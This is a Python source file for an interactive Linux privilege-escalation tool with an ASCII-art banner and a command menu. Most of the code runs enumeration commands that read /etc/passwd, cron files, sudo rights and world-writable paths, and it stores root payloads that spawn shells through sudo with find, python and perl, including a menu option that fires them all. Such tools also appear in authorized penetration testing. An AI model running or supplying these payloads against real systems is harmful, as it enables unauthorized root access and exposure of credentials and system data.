# Made by Fancy
import subprocess as sub
import time

red = '\033[38;2;255;0;0m\033m'
purple = '\033[0;35m'
green = '\033[0;32m'
blue = '\033[34m'
end = '\033[m'

root_payloads = {
    1: "sudo find /home -exec sh -i \;",
    2: """sudo python -c 'import os;os.system("/bin/bash");'""",
    3: """sudo python -c 'import pty;pty.spawn("/bin/bash")'""",
    4: """sudo python -c 'import pty;pty.spawn("/bin/sh")'""",
    5: "sudo find / -exec bash -i \;"
}
enumeration = {
    1: "cat /etc/passwd",
    2: "id",
    3: """cat /etc/passwd | egrep -e '/bin/(ba)?sh'""",
    4: "ls -l /etc/passed",
    5: "sudo -l",
    6: "uname -a",
    7: "ls -l /root",
    8: "ls -la /home",
    9: "find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null",
    10: "find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w -ls 2> /dev/null",
    11: """find / -name "*.txt" -ls 2> /dev/null""",
    12: """find / -name "*.log" -ls 2> /dev/null""",
    13: "ps -aux | grep root",
    14: "netstat -a | grep -i listen",
    15: "netstat -ano",
    16: "crontab -l",
    17: "ls -alh /var/spool/cron",
    18: "ls -al /etc/ | grep cron",
    19: "ls -al /etc/cron*",
    20: "cat /etc/cron*",
    21: "cat /etc/at.allow",
    22: "cat /etc/at.deny",
    23: "cat /etc/cron.allow",
    24: "cat /etc/cron.deny",
    25: "cat /etc/crontab",
    26: "cat /etc/anacrontab",
    27: "cat /var/spool/cron/crontabs/root",
    29: "arp -e",
}
privesc_scripts = {
    31: "https://github.com/rebootuser/LinEnum.git",
    32: "https://github.com/pentestmonkey/unix-privesc-check.git",
    33: "https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py"
}


def privesc():
    def banner():
        print(f"""
                {red}██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗  {blue}██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗{end}
                {red}██║     ██║████╗  ██║██║   ██║╚██╗██╔╝  {blue}██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝{end}
                {red}██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝   {blue}██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║{end}
                {red}██║     ██║██║╚██╗██║██║   ██║ ██╔██╗   {blue}██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║{end}
                {red}███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗  {blue}██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗{end}
                {red}╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝  {blue}╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝{end}\n\n""")

    banner()
    while True:
        script_shell = input(red + "Linux PrivEsc > " + end)
        if script_shell == "help" or script_shell == "???" or script_shell == "?":
            print(blue + """
 =============================================================
 +                                                           +
 |   enum - Display Enumeration Options                      |
 |   priv - Display Privilege Escalation Options             |
 |   exit - Exit The Script                                  |
 |   help/?/??? - Display The Help Menu                      |
 |   payloads - Display Privilege Escalation Payloads        |
 |   scripts - Display Other Scripts                         |
 |   creds - Show The Author                                 |
 |   banner/clear - Clear The Screen And Return To Banner    |
 |   shell - Spawn Normal Shell                              |
 +                                                           +
 =============================================================\n""" + end)
        elif script_shell == "enum":
            print(blue + """
==============================================================
+                                                            +
|   check_arp - Display Arp Entries                          |
|   check_cron - Cron Job Check                              |
|   check_sock - Check For Processes With Listening Sockets  |
|   check_root - Check For Root Level Processes              |
|   check_file - Look For Interesting Files                  |
|   check_write - Check For World Writeable Directories      |
|   check_home - Check /home Persmissions                    |
|   check_root_perms - Check /root Persmissions              |
|   check_os - Check Operating System Info                   |
|   check_sudo - Check for Sudo Privs                        |
|   check_passwd - View Permissions On Passwd                |
|   check_shell - Print only users who have shell access     |
|   check_groups - Display Group Info                        |
|   check_passwords - Show Passwords File                    |
+                                                            +
==============================================================\n""" + end)
        elif script_shell == "check_arp":
            sub.call(enumeration[29], shell=True)
        elif script_shell == "check_cron":
            print(green + "Checking Crontab..." + end)
            sub.call(enumeration[16], shell=True)
            time.sleep(3)
            print(green + "Trying To Grab Cron Info..." + end)
            time.sleep(5)
            try:
                sub.call(enumeration[17], shell=True)
                sub.call(enumeration[18], shell=True)
                sub.call(enumeration[19], shell=True)
                sub.call(enumeration[20], shell=True)
                sub.call(enumeration[21], shell=True)
                sub.call(enumeration[22], shell=True)
                sub.call(enumeration[23], shell=True)
                sub.call(enumeration[24], shell=True)
                sub.call(enumeration[25], shell=True)
                sub.call(enumeration[26], shell=True)
                sub.call(enumeration[27], shell=True)
            except PermissionError:
                print("Could Not Grab Info Becuase Of A Permission Error...")
        elif script_shell == "check_sock":
            sub.call(enumeration[14], shell=True)
            sub.call(enumeration[15], shell=True)
        elif script_shell == "check_root":
            sub.call(enumeration[13], shell=True)
        elif script_shell == "check_file":
            sub.call(enumeration[11], shell=True)
            sub.call(enumeration[12], shell=True)
        elif script_shell == "check_write":
            sub.call(enumeration[10], shell=True)
        elif script_shell == "check_home":
            sub.call(enumeration[8], shell=True)
        elif script_shell == "check_root_perms":
            sub.call(enumeration[7], shell=True)
        elif script_shell == "check_os":
            sub.call(enumeration[6], shell=True)
        elif script_shell == "check_sudo":
            sub.call(enumeration[5], shell=True)
        elif script_shell == "check_passwd":
            sub.call(enumeration[4], shell=True)
        elif script_shell == "check_shell":
            sub.call(enumeration[3], shell=True)
        elif script_shell == "check_groups":
            sub.call(enumeration[2], shell=True)
        elif script_shell == "check_passwords":
            sub.call(enumeration[1], shell=True)
        elif script_shell == "clear" or script_shell == "banner":
            sub.call("clear", shell=True)
            banner()
        elif script_shell == "creds":
            print(green + "\n𝐦𝐚𝐝𝐞 𝐛𝐲 : 𝐅𝐚𝐧𝐜𝐲\n" + end)
        elif script_shell == "exit":
            exit(0)
        elif script_shell == "shell":
            try:
                sub.call("bash", shell=True)
            except PermissionError:
                sub.call("bin/bash", shell=True)
                pass
                try:
                    sub.call("sh", shell=True)
                except PermissionError:
                    sub.call("bin/sh", shell=True)
        elif script_shell == "scripts":
            print(blue + f"""
1 : {privesc_scripts[31]}
2 : {privesc_scripts[32]}
3 : {privesc_scripts[33]}\n""" + end)
        elif script_shell == "payloads":
            print(blue + f"""
Payload 1 : {root_payloads[1]}
Payload 2 : {root_payloads[2]}
Payload 3 : {root_payloads[3]}
Payload 4 : {root_payloads[4]}
Payload 5 : {root_payloads[5]}
\n""" + end)
        elif script_shell == "priv":
            print(blue + """
=============================================================
+                                                           +
|   root_all - Attempt Root Access Via All Methods          |
|   lucky_root - Attempt Root Via Low Hanging Apples        |
|   perl_root - Attempt Root Via Perl                       |
|   python_root - Attempt Root Via Python                   |
+                                                           +
=============================================================\n""" + end)
        elif script_shell == "perl_root":
            try:
                sub.call("""perl -e 'exec "sudo /bin/bash";'""", shell=True)
            except PermissionError:
                sub.call("""perl -e 'exec "sudo /bin/sh";'""", shell=True)
        elif script_shell == "python_root":
            try:
                sub.call("""sudo python -c 'import os;os.system("/bin/bash");'""", shell=True)
                sub.call("""sudo python -c 'import pty;pty.spawn("/bin/sh")'""", shell=True)
                sub.call("""sudo python -c 'import pty;pty.spawn("/bin/bash")'""", shell=True)
            except PermissionError:
                print("Failed...")
                time.sleep(3)
        elif script_shell == "lucky_root":
            try:
                sub.call("sudo su", shell=True)
                sub.call("sudo bash", shell=True)
                sub.call("sudo sh", shell=True)
                sub.call("sudo /bin/bash", shell=True)
                sub.call("sudo /bin/sh", shell=True)
            except PermissionError:
                print(red + "[-]  Failed  [-]" + end)
        elif script_shell == "root_all":
            try:
                sub.call(root_payloads[1], shell=True)
                sub.call(root_payloads[2], shell=True)
                sub.call(root_payloads[3], shell=True)
                sub.call(root_payloads[4], shell=True)
                sub.call(root_payloads[5], shell=True)
            except PermissionError:
                exit(f"[{red}FAILED{end}]")


if __name__ == '__main__':
    sub.call("clear", shell=True)
    try:
        privesc()
    except KeyboardInterrupt:
        exit(0)
